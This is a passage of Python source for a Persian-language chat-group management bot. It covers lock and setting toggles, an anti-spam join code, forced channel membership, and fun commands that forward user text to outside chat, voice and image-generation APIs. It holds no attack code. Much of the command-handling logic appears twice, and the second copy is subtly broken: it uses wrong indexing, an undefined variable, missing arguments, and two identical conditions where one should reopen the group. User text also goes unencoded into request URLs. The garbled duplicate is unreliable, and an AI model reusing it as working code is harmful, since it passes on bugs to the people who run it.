                                            steps = ['تاس', 'عدد شانسی', 'سکه', 'جوک', 'چالش', 'بیو', 'فکت', 'اعتراف', 'دانستنی', 'داستان', 'تکست', 'گنگ', 'فونت', 'فال حافظ', 'پروفایل', 'بکگراند', 'انگیزشی', 'ذکر', 'والپیپر', 'پروکسی', 'فتوگرافی', 'دقت', 'حق', 'پ ن پ', 'ویس', '/', 'ویس زن', 'ویس مرد', 'ساخت عکس', 'لوگو', 'عکس', 'لوگو3', 'لوگو2', '//', 'سخنگو', 'ترجمه', 'افکت', 'اسم', 'ارز']
                                            for step in steps:
                                                key = int(Listkeys[step])
                                                ORDERS_KEYS[key] = str(int(Vb))
                                            INFOS[object_guid]['keys'] = ''.join(ORDERS_KEYS)
                                            mess = MPro(f"{cmd} {cmdx} است. {ST['ok']}", 2)
                                        else:
                                            mess = MPro(f"دسترسی تغییر آن را ندارید. {ST['ok']}", 2)
                                    elif cmd == 'سخنگو با ادب' or cmd == 'سخنگو باادب' or cmd == 'سخنگو بی ادب' or (cmd == 'سخنگو بی\u200cادب'):
                                        if TIP >= 4:
                                            if cmd == 'سخنگو بی ادب' or cmd == 'سخنگو بی\u200cادب':
                                                if Vb:
                                                    handle_text_file('rude')
                                                    typespeak = 'rude'
                                                else:
                                                    handle_text_file('polit')
                                                    typespeak = 'polit'
                                            elif Vb:
                                                handle_text_file('polit')
                                                typespeak = 'polit'
                                            else:
                                                handle_text_file('rude')
                                                typespeak = 'rude'

                                            mess = MPro(f"{cmd} {cmdx} است. {ST['ok']}", 2)
                                        else:
                                            mess = MPro(f"دسترسی تغییر آن را ندارید. {ST['ok']}", 2)
                                    elif cmd == 'افزودن عضو':
                                        Set_group_default_access(object_guid, 'AddMember', Vb)
                                        mess = MPro(f"{cmd} {cmdx} است. {ST['ok']}", 2)
                                    elif cmd == 'مشاهده مدیر' or cmd == 'مشاهده مدیران':
                                        Set_group_default_access(object_guid, 'ViewAdmins', Vb)
                                        mess = MPro(f"{cmd} {cmdx} است. {ST['ok']}", 2)
                                    elif cmd == 'مشاهده اعضا':
                                        Set_group_default_access(object_guid, 'ViewMembers', Vb)
                                        mess = MPro(f"{cmd} {cmdx} است. {ST['ok']}", 2)
                                    elif cmd == 'گپ' or cmd == 'گروه':
                                        Set_group_default_access(object_guid, 'SendMessages', Vb)
                                        mess = MPro(f"{cmd} {cmdx} است. {ST['ok']}", 2)
                                    steps = cmd.split(' ')
                                    if cmd in Listlocks:
                                        isok = True
                                        if TIP <= 3 and int(SETTING_KEYS[18]) == 0:
                                            isok = False
                                        if isok:
                                            key = int(Listlocks[cmd])
                                            LOCKS_KEYS[key] = str(int(Vb))
                                            INFOS[object_guid]['locks'] = ''.join(LOCKS_KEYS)
                                            mess = MPro(f"{cmd} {cmdx} است. {ST['ok']}", 2)
                                    elif cmd in Listset:
                                        isok = True
                                        if TIP <= 3 and int(SETTING_KEYS[16]) == 0:
                                            isok = False
                                        if cmd == 'تنظیم دستورات':
                                            if TIP <= 2:
                                                isok = False
                                                mess = MPro(f"دسترسی تغییر آن را ندارید. {ST['ok']}", 2)
                                        elif cmd == 'تنظیم محدودیت':
                                            if TIP <= 2:
                                                isok = False
                                                mess = MPro(f"دسترسی تغییر آن را ندارید. {ST['ok']}", 2)
                                        if isok:
                                            key = int(Listset[cmd])
                                            SETTING_KEYS[key] = str(int(Vb))
                                            INFOS[object_guid]['setting'] = ''.join(SETTING_KEYS)
                                            mess = MPro(f"{cmd} {cmdx} است. {ST['ok']}", 2)
                                            if cmd == 'حذف خودکار':
                                                if int(Vb) == 1:
                                                    timer = 60
                                                    commands_auto = ['حذف پیام مدیریتی-']
                                                    new = []
                                                    for step in INFOS[object_guid]['AUTOS']:
                                                        if len(commands_auto) > 0:
                                                            commands_new = []
                                                            for cm_auto_saved in step['COMMANDS']:
                                                                deleted = False
                                                                for cm_auto in commands_auto:
                                                                    if cm_auto == cm_auto_saved:
                                                                        deleted = True
                                                                if not deleted:
                                                                    commands_new.append(cm_auto_saved)
                                                            if len(commands_new) <= 0:
                                                                continue
                                                            step['COMMANDS'] = commands_new
                                                        elif step['PERTIME']['per'] == timer:
                                                            continue
                                                        new.append(step)
                                                    INFOS[object_guid]['AUTOS'] = new
                                                    time_come = get_iran_timestamp()
                                                    STEP = {}
                                                    STEP['TYPE'] = 'pertime'
                                                    STEP['PERTIME'] = {}
                                                    STEP['PERTIME']['old'] = time_come
                                                    STEP['PERTIME']['per'] = timer
                                                    STEP['COMMANDS'] = commands_auto
                                                    STEP['GUID_SENDER'] = guid_sender
                                                    INFOS[object_guid]['AUTOS'].append(STEP)
                                                elif int(Vb) == 0:
                                                    STMessages[object_guid] = []
                                            elif cmd == 'ضد تبچی':
                                                if Vb:
                                                    Set_group_default_access(object_guid, 'SendMessages', False)
                                                    try:
                                                        ResultME = send_message(OBJM, MPro(f"گپ بسته شد. {ST['ok']}", 2), message_id)
                                                    except:
                                                        ResultME = send_message(OBJM, MPro(f"گپ بسته نشد. {ST['ok']}", 2), message_id)
                                                    nxx = ''
                                                    y = 3
                                                    x = 0
                                                    while x < len(object_guid):
                                                        nxx += object_guid[x:x + y]
                                                        x += y
                                                    extra = MPro(f"برای چت کردن باید اد بشی. {ST['ok']}", 2)
                                                    extra += MPro(f"کد زیر رو پی ویم ارسال کن تا ادمینت کنم. {ST['ok']}", 2)
                                                    extra += '\n'
                                                    extra += MPro(f'#{nxx}')
                                                    message_sended_id = client.send_text(object_guid, extra)['message_update']['message_id']
                                                    client.pin_message(object_guid, message_sended_id)
                                                    ResultME = send_message(OBJM, MPro(f"پیام پین شد. {ST['ok']}", 2), message_sended_id)
                                                else:
                                                    Set_group_default_access(object_guid, 'SendMessages', True)
                                                    try:
                                                        ResultME = send_message(OBJM, MPro(f"گپ باز شد. {ST['ok']}", 2), message_id)
                                                    except:
                                                        ResultME = send_message(OBJM, MPro(f"گپ باز نشد. {ST['ok']}", 2), message_id)
                                            elif cmd == 'عضویت اجباری':
                                                if Vb:
                                                    if len(INFOS[object_guid]['channels']) == 0:
                                                        extra = MPro(f"عزیزم لطفا چنل یا گروهی تعریف کن تا کاربرارو مجبور به عضو شدن کنم. {ST['ok']}", 3)
                                                        extra += MPro(f"و توجه داشته باش که من باید در این چنل یا گروه ها ادمین باشم تا بتونم چک کنم. {ST['ok']}", 3)
                                                        extra += '\n'
                                                        extra += MPro(f'عضویت @example', 2)
                                                        extra += MPro(f'عضویت اجباری روشن / خاموش ', 2)
                                                        extra += MPro(f'لیست عضویت ', 2)
                                                        extra += MPro(f'پاکسازی لیست عضویت', 2)
                                                        extra += MPro(f'بررسی مجدد عضویت', 2)
                                                        client.send_text(object_guid, extra, message_id)
                                            elif cmd == 'سخنگو':
                                                if not Vb:
                                                    ARMessages[object_guid] = []
                                            elif cmd == 'ربات':
                                                if not Vb:
                                                    ARMessages[object_guid] = []
                                    elif len(steps) >= 1:
                                        isban = steps[0]
                                        order = cmd.replace(isban, '').strip()
                                        if isban == 'بن':
                                            if order in Listlocks:
                                                locks_ban = list(INFOS[object_guid]['locks_ban'])
                                                s = str(int(Vb))
                                                locks_ban[Listlocks[order]] = s
                                                INFOS[object_guid]['locks_ban'] = ''.join(locks_ban)
                                                mess = MPro(f"{cmd} {cmdx} است. {ST['ok']}", 2)
                                        elif isban == 'اخطار':
                                            if order in Listlocks:
                                                locks_warning_show = list(INFOS[object_guid]['locks_warning_show'])
                                                locks_warning_show[Listlocks[order]] = str(int(Vb))
                                                INFOS[object_guid]['locks_warning_show'] = ''.join(locks_warning_show)
                                                mess = MPro(f"{cmd} {cmdx} است. {ST['ok']}", 2)
                                elif cmd == 'سرگرمی':
                                    if TIP >= 4:
                                        steps = ['تاس', 'عدد شانسی', 'سکه', 'جوک', 'چالش', 'بیو', 'فکت', 'اعتراف', 'دانستنی', 'داستان', 'تکست', 'گنگ', 'فونت', 'فال حافظ', 'پروفایل', 'بکگراند', 'انگیزشی', 'ذکر', 'والپیپر', 'پروکسی', 'فتوگرافی', 'دقت', 'حق', 'پ ن پ', 'ویس', '/', 'ویس زن', 'ویس مرد', 'ساخت عکس', 'لوگو', 'عکس', 'لوگو3', 'لوگو2', '//', 'سخنگو', 'ترجمه', 'افکت', 'اسم', 'ارز']
                                        for step in steps:
                                            key = int(Listkeys[step])
                                            ORDERS_KEYS[key] = str(int(Vb))
                                        INFOS[object_guid]['keys'] = ''.join(ORDERS_KEYS)
                                        mess = MPro(cmd + ' ' + cmdx + ' است. ' + ST['ok'], 2)
                                    else:
                                        mess = MPro('دسترسی تغییر آن را ندارید. ' + ST['ok'], 2)
                                elif cmd == 'سخنگو با ادب' or cmd == 'سخنگو باادب' or cmd == 'سخنگو بی ادب' or (cmd == 'سخنگو بی\u200cادب'):
                                    if TIP >= 4:
                                        if cmd == 'سخنگو بی ادب' or cmd == 'سخنگو بی\u200cادب':
                                            if Vb:
                                                SPEAKD = copy.copy(SpeakD2)
                                                handle_text_file('rude')
                                            else:
                                                SPEAKD = copy.copy(SpeakDpolite)
                                                handle_text_file('polit')
                                            mess = MPro(cmd + ' ' + cmdx + ' است. ' + ST['ok'], 2)
                                    else:
                                        mess = MPro('دسترسی تغییر آن را ندارید. ' + ST['ok'], 2)
                                elif cmd == 'افزودن عضو':
                                    Set_group_default_access(object_guid, 'AddMember', Vb)
                                    mess = MPro(cmd + ' ' + cmdx + ' است. ' + ST['ok'], 2)
                                elif cmd == 'مشاهده مدیر' or cmd == 'مشاهده مدیران':
                                    Set_group_default_access(object_guid, 'ViewAdmins')
                                    mess = MPro(cmd + ' ' + cmdx + ' است. ' + ST['ok'], 2)
                                elif cmd == 'مشاهده اعضا':
                                    Set_group_default_access(object_guid, 'ViewMembers')
                                    mess = MPro(cmd + ' ' + cmdx + ' است. ' + ST['ok'], 2)
                                elif cmd == 'گپ' or cmd == 'گروه':
                                    Set_group_default_access(object_guid, 'SendMessages', Vb)
                                    mess = MPro(cmd + ' ' + cmdx + ' است. ' + ST['ok'], 2)
                                    steps = cmd.split(' ')
                                    if cmd in Listlocks:
                                        isok = True
                                        if TIP <= 3 and int(SETTING_KEYS[18]) == 0:
                                            isok = False
                                        if isok:
                                            key = int(Listlocks[cmd])
                                            LOCKS_KEYS[key] = str(int(Vb))
                                            INFOS[object_guid]['locks'] = ''.join(LOCKS_KEYS)
                                            mess = MPro(cmd + ' ' + cmdx + ' است. ' + ST['ok'], 2)
                                    elif cmd in Listset:
                                        isok = True
                                        if TIP <= 3 and int(SETTING_KEYS[16]) == 0:
                                            isok = False
                                        elif len(steps) >= 1:
                                            isban = steps[0]
                                            order = cmd.replace(isban, '').strip()
                                            if isban == 'بن':
                                                if order in Listlocks:
                                                    locks_ban = list(INFOS[object_guid]['locks_ban'])
                                                    Listlocks[order][locks_ban] = str(int(Vb))
                                                    INFOS[object_guid]['locks_ban'] = ''.join(locks_ban)
                                                    mess = MPro(cmd + ' ' + cmdx + ' است. ' + ST['ok'], 2)
                                            elif isban == 'اخطار':
                                                if order in Listlocks:
                                                    locks_warning_show = list(INFOS[object_guid]['locks_warning_show'])
                                                    Listlocks[order][locks_warning_show] = str(int(Vb))
                                                    INFOS[object_guid]['locks_ban'] = ''.join(locks_warning_show)
                                                    mess = MPro(cmd + ' ' + cmdx + ' است. ' + ST['ok'], 2)
                                elif cmd == 'تنظیم دستورات':
                                    if TIP <= 2:
                                        isok = False
                                        mess = MPro('دسترسی تغییر آن را ندارید. ' + ST['ok'], 2)
                                    if isok:
                                        key = int(Listset[cmd])
                                        SETTING_KEYS[key] = str(int(Vb))
                                        INFOS[object_guid]['setting'] = ''.join(SETTING_KEYS)
                                        mess = MPro(cmd + ' ' + cmdx + ' است. ' + ST['ok'], 2)
                                elif cmd == 'تنظیم محدودیت':
                                    if TIP <= 2:
                                        isok = False
                                        mess = MPro('دسترسی تغییر آن را ندارید. ' + ST['ok'], 2)
                                    if isok:
                                        key = int(Listset[cmd])
                                        SETTING_KEYS[key] = str(int(Vb))
                                        INFOS[object_guid]['setting'] = ''.join(SETTING_KEYS)
                                        mess = MPro(cmd + ' ' + cmdx + ' است. ' + ST['ok'], 2)
                                elif cmd == 'حذف خودکار':
                                    if int(Vb) == 1:
                                        timer = 60
                                        commands_auto = 'حذف پیام مدیریتی-'
                                        new = []
                                        for step in INFOS[object_guid]['AUTOS']:
                                            if len(commands_auto) > 0:
                                                commands_new = []
                                                for cm_auto_saved in step['COMMANDS']:
                                                    deleted = False
                                                    if cm_auto == cm_auto_saved:
                                                        deleted = True
                                                    if deleted:
                                                        pass
                                                    else:
                                                        commands_new.append(cm_auto_saved)
                                                        continue
                                                if len(commands_new) <= 0:
                                                    continue
                                                else:
                                                    commands_new[step] = 'COMMANDS'
                                            elif step['PERTIME']['per'] == timer:
                                                continue
                                            else:
                                                new.append(step)
                                                continue
                                        INFOS[object_guid]['AUTOS'] = new
                                        time_come = get_iran_timestamp()
                                        STEP = {}
                                        STEP['TYPE'] = 'pertime'
                                        STEP['PERTIME'] = {}
                                        STEP['PERTIME']['old'] = time_come
                                        STEP['PERTIME']['per'] = timer
                                        STEP['COMMANDS'] = commands_auto
                                        STEP['GUID_SENDER'] = guid_sender
                                        INFOS[object_guid]['AUTOS'].append(STEP)
                                    elif int(Vb) == 0:
                                        STMessages[object_guid] = []
                                        timer = 60
                                        commands_auto = ['حذف پیام مدیریتی-']
                                        new = []
                                        for step in INFOS[object_guid]['AUTOS']:
                                            if len(commands_auto) > 0:
                                                commands_new = []
                                                for cm_auto_saved in step['COMMANDS']:
                                                    deleted = False
                                                    for cm_auto in commands_auto:
                                                        if cm_auto == cm_auto_saved:
                                                            deleted = True
                                                            break
                                                    if not deleted:
                                                        commands_new.append(cm_auto_saved)
                                                if len(commands_new) <= 0:
                                                    continue
                                                step['COMMANDS'] = commands_new
                                            elif step['PERTIME']['per'] == timer:
                                                continue
                                            new.append(step)
                                        INFOS[object_guid]['AUTOS'] = new
                                elif cmd == 'ضد تبچی' and Vb:
                                    try:
                                        Set_group_default_access(object_guid, 'SendMessages', False)
                                        ResultME = send_message(OBJM, MPro('گپ بسته شد. ' + ST['ok'], 2), message_id=message_id)
                                    except:
                                        ResultME = send_message(OBJM, MPro('گپ بسته نشد. ' + ST['ok'], 2), message_id=message_id)
                                    nxx = ''
                                    y = 3
                                    x = 0
                                    while x < len(object_guid):
                                        nxx += object_guid[x:x + y]
                                        x += y
                                    extra = MPro('برای چت کردن باید اد بشی. ' + ST['ok'])
                                    extra += MPro('کد زیر رو پی ویم ارسال کن تا ادمینت کنم. ' + ST['ok'])
                                    extra += '\n'
                                    extra += MPro('#' + str(nxx))
                                    message_sended_id = client.send_text(object_guid, extra)['message_update']['message_id']
                                    client.pin_message(object_guid, message_sended_id)
                                    ResultME = send_message(OBJM, MPro('پیام پین شد. ' + ST['ok'], 2), message_id=message_sended_id)
                                elif cmd == 'ضد تبچی' and Vb:
                                    try:
                                        Set_group_default_access(object_guid, 'SendMessages', True)
                                        ResultME = send_message(OBJM, MPro('گپ باز شد. ' + ST['ok'], 2), message_id=message_id)
                                    except:
                                        ResultME = send_message(OBJM, MPro('گپ باز نشد. ' + ST['ok'], 2), message_id=message_id)
                                elif cmd == 'عضویت اجباری' and Vb:
                                    if len(INFOS[object_guid]['channels']) == 0:
                                        extra = MPro('عزیزم لطفا چنل یا گروهی تعریف کن تا کاربرارو مجبور به عضو شدن کنم. ' + ST['ok'])
                                        extra += MPro('و توجه داشته باش که من باید در این چنل یا گروه ها ادمین باشم تا بتونم چک کنم. ' + ST['ok'])
                                        extra += '\n'
                                        extra += MPro('عضویت @example', 2)
                                        extra += MPro('عضویت اجباری روشن / خاموش ', 2)
                                        extra += MPro('لیست عضویت ', 2)
                                        extra += MPro('پاکسازی لیست عضویت', 2)
                                        extra += MPro('بررسی مجدد عضویت', 2)
                                        client.send_text(object_guid, extra, message_id)
                                elif cmd == 'سخنگو' and Vb:
                                    ARMessages[object_guid] = []
                                elif cmd == 'ربات' and Vb:
                                    ARMessages[object_guid] = []
                            elif command.startswith('تنظیم ') and (not mess):
                                xcomand = command.replace('تنظیم ', '').strip()
                                if xcomand.startswith('اخطار'):
                                    isok = False
                                    zcomand = xcomand.replace('اخطار', '').strip()
                                    spaces = zcomand.split(' ')
                                    if len(spaces) > 1:
                                        spaces.reverse()
                                    count = spaces[0]
                                    order = zcomand.replace(count, '').strip()
                                    iscount = False
                                    try:
                                        count = int(count)
                                        iscount = True
                                    except:
                                        pass
                                    if iscount:
                                        if len(order) > 0:
                                            if order in Listlocks:
                                                key_order = Listlocks[order]
                                                locks_warning = list(INFOS[object_guid]['locks_warning'])
                                                if count >= 10:
                                                    count = 9
                                                elif count <= 0:
                                                    count = 0
                                                locks_warning[key_order] = str(count)
                                                isok = True
                                                INFOS[object_guid]['locks_warning'] = ''.join(locks_warning)
                                            else:
                                                mess = MPro('قفل مورد نظر یافت نشد.' + ST['ok'], 2)
                                        else:
                                            if count > 100:
                                                count = 100
                                            elif count <= 0:
                                                count = 0
                                            isok = True
                                            INFOS[object_guid]['warnning'] = count
                                    if isok:
                                        mess = MPro(xcomand + ' تنظیم شد. ' + ST['ok'], 2)
                                elif xcomand.startswith('فونت'):
                                    zcomand = xcomand.replace('فونت', '').strip()
                                    if zcomand in Fonts_text:
                                        zcomand = Fonts_text[zcomand]
                                        INFOS[object_guid]['types']['font'] = zcomand
                                        mess = MPro(xcomand + ' تنظیم شد. ' + ST['ok'], 2)
                                    else:
                                        mess = MPro(' فونت موردنظر یافت نشد. ' + ST['ok'], 2)
                                elif xcomand.startswith('شکل'):
                                    zcomand = xcomand.replace('شکل', '').strip()
                                    if zcomand in Types_text:
                                        zcomand = Types_text[zcomand]
                                        INFOS[object_guid]['types']['type'] = zcomand
                                        mess = MPro(xcomand + ' تنظیم شد. ' + ST['ok'], 2)
                                    else:
                                        mess = MPro(' شکل موردنظر یافت نشد. ' + ST['ok'], 2)
                                elif xcomand.startswith('علامت'):
                                    zcomand = xcomand.replace('علامت', '')
                                    INFOS[object_guid]['types']['ok'] = zcomand.strip()[0:4]
                                    mess = MPro(xcomand + ' تنظیم شد. ' + ST['ok'], 2)

                        if mess:
                            ResultME = send_message(OBJM, mess, message_id=message_id)

                if is_reply_message and (not ResultME) and (command in list_command_users_reply_keys):
                    if TIP >= 4:
                        step1 = 1
                        step2 = 1
                        step3 = True
                    else:
                        step1 = PorotectMSS(SETTING_KEYS, TimeMessages, 5)
                        step2 = int(ORDERS_KEYS[Listkeys[command]])
                        step3 = int(SETTING_KEYS[0])
                    if step1 and step2 and step3:
                        if TIP <= 3 and int(SETTING_KEYS[14]):
                            isok = joining(INFOOBJECT['channels'], object_guid, guid_sender, ST['ok'])
                            if isok:
                                ResultME = send_message(OBJM, isok, message_id=message_id)
                            elif isok is False:
                                ResultME = True
                        if not ResultME:
                            text = list_command_users_reply[command](OBJM)
                            send_message(OBJM, text, message_id=message_id)
                            ResultME = True
                if not ResultME and command in list_command_users_keys:
                    if TIP >= 4:
                        step1 = 1
                        step2 = 1
                        step3 = True
                    else:
                        step1 = PorotectMSS(SETTING_KEYS, TimeMessages, 5)
                        step2 = int(ORDERS_KEYS[Listkeys[command]])
                        step3 = int(SETTING_KEYS[0])
                    if step1 and step2 and step3:
                        if int(SETTING_KEYS[14]) and TIP <= 3:
                            isok = joining(INFOOBJECT['channels'], object_guid, guid_sender, ST['ok'])
                            if isok:
                                ResultME = send_message(OBJM, isok, message_id=message_id)
                            elif isok is False:
                                ResultME = True
                        if not ResultME:
                            text = list_command_users[command](OBJM)
                            send_message(OBJM, text, message_id=message_id)
                            ResultME = True
            if TIP >= 2 and (not ResultME) and is_reply_message:
                if TIP <= 3 and int(SETTING_KEYS[14]):
                    isok = joining(INFOOBJECT['channels'], object_guid, guid_sender, ST['ok'])
                    if isok:
                        ResultME = send_message(OBJM, isok, message_id)
                    elif isok is False:
                        ResultME = True
                if not ResultME:
                    if command == '/':
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['/']])
                        if isok:
                            steps = get_reply_text(OBJM, object_guid, is_reply_message)
                            mess = steps['text']
                            if steps['ok']:
                                QUS = steps['text']
                                if len(QUS) > 0:
                                    mess = MPro('خطایی در دریافت دیتا رخ داد. ' + ST['ok'], 2)
                                    baner = INFOS[object_guid]['baner']
                                    ResultME = send_message(OBJM, 'لطفا صبر کنید...\n' + baner, message_id=message_id)
                                    try:
                                        mess = requests.get(f'https://api-free.ir/api/chat.php?text={QUS}', timeout=30).json()['result']
                                    except:
                                        pass
                                    ResultME = send_message_limited(OBJM, '**' + mess + '**', is_reply_message)
                    elif command == '//':
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['//']])
                        if isok:
                            steps = get_reply_text(OBJM, object_guid, is_reply_message)
                            mess = steps['text']
                            if steps['ok']:
                                QUS = steps['text']
                                if len(QUS) > 0:
                                    mess = MPro('خطایی در دریافت دیتا رخ داد. ' + ST['ok'], 2)
                                    baner = INFOS[object_guid]['baner']
                                    ResultME = send_message(OBJM, 'لطفا صبر کنید...\n' + baner, message_id=message_id)
                                    try:
                                        mess = requests.get(f'https://api-free.ir/api/chat2.php?text={QUS}', timeout=30).json()['result']
                                    except:
                                        pass
                                    if mess:
                                        ResultME = send_message_limited(OBJM, '**' + mess + '**', is_reply_message)
                    elif command == 'ویس زن':
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['ویس زن']])
                        if isok:
                            steps = get_reply_text(OBJM, object_guid, is_reply_message)
                            mess = steps['text']
                            sended = False
                            if steps['ok']:
                                QUS = steps['text']
                                mess = MPro('خطایی در دریافت دیتا رخ داد. ' + ST['ok'], 2)
                                if len(QUS) > 0:
                                    baner = INFOS[object_guid]['baner']
                                    ResultME = send_message(OBJM, 'لطفا صبر کنید...\n' + baner, message_id=message_id)
                                    name_file = f'voice_{str(get_iran_timestamp())}.mp3'
                                    try:
                                        voice_AI(QUS, 'DilaraNeural', name_file)
                                        text = MPro('متن شما : ' + QUS, 4)
                                        ResultME = client.send_voice(object_guid, name_file, message_id, name_file, text)
                                        sended = True
                                        save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                    except Exception as e:
                                        print(e)
                                    try:
                                        os.remove(name_file)
                                    except:
                                        pass
                                if not sended:
                                    ResultME = send_message(OBJM, mess, message_id=message_id)
                    elif command == 'ویس مرد':
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['ویس مرد']])
                        if isok:
                            steps = get_reply_text(OBJM, object_guid, is_reply_message)
                            mess = steps['text']
                            sended = False
                            if steps['ok']:
                                QUS = steps['text']
                                mess = MPro('خطایی در دریافت دیتا رخ داد. ' + ST['ok'], 2)
                                if len(QUS) > 0:
                                    baner = INFOS[object_guid]['baner']
                                    ResultME = send_message(OBJM, 'لطفا صبر کنید...\n' + baner, message_id=message_id)
                                    name_file = f'voice_{str(get_iran_timestamp())}.mp3'
                                    try:
                                        voice_AI(QUS, 'FaridNeural', name_file)
                                        text = MPro('متن شما : ' + QUS, 4)
                                        ResultME = client.send_voice(object_guid, name_file, message_id, name_file, text)
                                        sended = True
                                        save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                    except Exception as e:
                                        print(e)
                                    try:
                                        os.remove(name_file)
                                    except:
                                        pass
                                if not sended:
                                    ResultME = send_message(OBJM, mess, message_id=message_id)
                    elif command == 'لوگو2':
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['لوگو2']])
                        if isok:
                            steps = get_reply_text(OBJM, object_guid, is_reply_message)
                            mess = steps['text']
                            sended = False
                            if steps['ok']:
                                QUS = steps['text']
                                mess = MPro('خطایی در دریافت دیتا رخ داد. ' + ST['ok'], 2)
                                if len(QUS) > 0:
                                    if object_guid not in limitAPI:
                                        limitAPI[object_guid] = 0
                                    else:
                                        limitAPI[object_guid] += 1
                                        if limitAPI[object_guid] < 6:
                                            mess = MPro('خطایی در دریافت دیتا رخ داد. ' + ST['ok'], 2)
                                            baner = INFOS[object_guid]['baner']
                                            ResultME = send_message(OBJM, 'لطفا صبر کنید...\n' + baner, message_id=message_id)
                                            if not is_english_text(QUS):
                                                QUS = Translater(QUS, to_lang='en')
                                            try:
                                                urls = requests.get('https://api-free.ir/api/Logo-top.php?page=90&text=' + QUS, timeout=30).json()['result']
                                                rand = random.randint(0, len(urls) - 1)
                                                url = urls[rand].replace(';', '&')
                                                response = requests.get(url)
                                                name_file = f'logo2_{str(get_iran_timestamp())}.png'
                                                with open(name_file, 'wb') as file:
                                                    file.write(response.content)
                                                    file.close()
                                                text = MPro('متن شما : ' + QUS, 4)
                                                ResultME = client.send_image(object_guid, name_file, message_id, text)
                                                sended = True
                                                save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                            except:
                                                pass
                                            try:
                                                os.remove(name_file)
                                            except:
                                                pass
                                        if not sended:
                                            ResultME = send_message(OBJM, mess, message_id=message_id)
                    elif command == 'لوگو':
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['لوگو']])
                        if isok:
                            steps = get_reply_text(OBJM, object_guid, is_reply_message)
                            mess = steps['text']
                            sended = False
                            if steps['ok']:
                                QUS = steps['text']
                                mess = MPro('خطایی در دریافت دیتا رخ داد. ' + ST['ok'], 2)
                                if len(QUS) > 0:
                                    if object_guid not in limitAPI:
                                        limitAPI[object_guid] = 0
                                    else:
                                        limitAPI[object_guid] += 1
                                        if limitAPI[object_guid] < 6:
                                            mess = MPro('خطایی در دریافت دیتا رخ داد. ' + ST['ok'], 2)
                                            baner = INFOS[object_guid]['baner']
                                            ResultME = send_message(OBJM, 'لطفا صبر کنید...\n' + baner, message_id=message_id)
                                            if not is_english_text(QUS):
                                                QUS = Translater(QUS, to_lang='en')
                                            try:
                                                urls = requests.get('http://api2.haji-api.ir/ephoto360?type=text&id=' + QUS, timeout=30).json()['result']
                                                rand = random.randint(0, len(urls) - 1)
                                                url = urls[rand].replace(';', '&')
                                                response = requests.get(url)
                                                name_file = f'logo_{str(get_iran_timestamp())}.png'
                                                with open(name_file, 'wb') as file:
                                                    file.write(response.content)
                                                    file.close()
                                                text = MPro('متن شما : ' + QUS, 4)
                                                ResultME = client.send_image(object_guid, name_file, message_id, text)
                                                sended = True
                                                save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                            except:
                                                pass
                                            try:
                                                os.remove(name_file)
                                            except:
                                                pass
                                        if not sended:
                                            ResultME = send_message(OBJM, mess, message_id=message_id)
                    elif command == 'عکس':
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['عکس']])
                        if isok:
                            steps = get_reply_text(OBJM, object_guid, is_reply_message)
                            mess = steps['text']
                            sended = False
                            if steps['ok']:
                                QUS = steps['text']
                                mess = MPro('خطایی در دریافت دیتا رخ داد. ' + ST['ok'], 2)
                                if len(QUS) > 0:
                                    if object_guid not in limitAPI:
                                        limitAPI[object_guid] = 0
                                    else:
                                        limitAPI[object_guid] += 1
                                        if limitAPI[object_guid] < 6:
                                            mess = MPro('خطایی در دریافت دیتا رخ داد. ' + ST['ok'], 2)
                                            baner = INFOS[object_guid]['baner']
                                            ResultME = send_message(OBJM, 'لطفا صبر کنید...\n' + baner, message_id=message_id)
                                            if not is_english_text(QUS):
                                                QUS = Translater(QUS, to_lang='en')
                                            try:
                                                urls = requests.get('https://haji-api.ir/prompts/?text=' + QUS, timeout=30).json()['result']
                                                rand = random.randint(0, len(urls) - 1)
                                                url = urls[rand].replace(';', '&')
                                                response = requests.get(url)
                                                name_file = f'photoAi_{str(get_iran_timestamp())}.png'
                                                with open(name_file, 'wb') as file:
                                                    file.write(response.content)
                                                    file.close()
                                                text = MPro('متن شما : ' + QUS, 4)
                                                ResultME = client.send_image(object_guid, name_file, message_id, text)
                                                sended = True
                                                save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                            except:
                                                pass
                                            try:
                                                os.remove(name_file)
                                            except:
                                                pass
                                        if not sended:
                                            ResultME = send_message(OBJM, mess, message_id=message_id)
                    elif command == 'ساخت عکس':
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['ساخت عکس']])
                        if isok:
                            steps = get_reply_text(OBJM, object_guid, is_reply_message)
                            mess = steps['text']
                            sended = False
                            if steps['ok']:
                                QUS = steps['text']
                                mess = MPro('خطایی در دریافت دیتا رخ داد. ' + ST['ok'], 2)
                                if len(QUS) > 0:
                                    if object_guid not in limitAPI:
                                        limitAPI[object_guid] = 0
                                    else:
                                        limitAPI[object_guid] += 1
                                        if limitAPI[object_guid] < 6:
                                            mess = MPro('خطایی در دریافت دیتا رخ داد. ' + ST['ok'], 2)
                                            baner = INFOS[object_guid]['baner']
                                            ResultME = send_message(OBJM, 'لطفا صبر کنید...\n' + baner, message_id=message_id)
                                            if not is_english_text(QUS):
                                                QUS = Translater(QUS, to_lang='en')
                                            try:
                                                data = requests.get('https://api-free.ir/api/img.php?text=' + QUS + '&v=3.5', timeout=30).json()
                                                response = requests.get(random.choice(data['result']), timeout=30)
                                                name_file = f'photoAi_{str(get_iran_timestamp())}.png'
                                                with open(name_file, 'wb') as file:
                                                    file.write(response.content)
                                                    file.close()
                                                text = MPro('متن شما : ' + QUS, 4)
                                                ResultME = client.send_image(object_guid, name_file, message_id, text)
                                                sended = True
                                                save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                            except:
                                                pass
                                            try:
                                                os.remove(name_file)
                                            except:
                                                pass
                                        if not sended:
                                            ResultME = send_message(OBJM, mess, message_id=message_id)
                    elif command == 'حذف فیلتر':
                        isok = 1
                        if TIP <= 3:
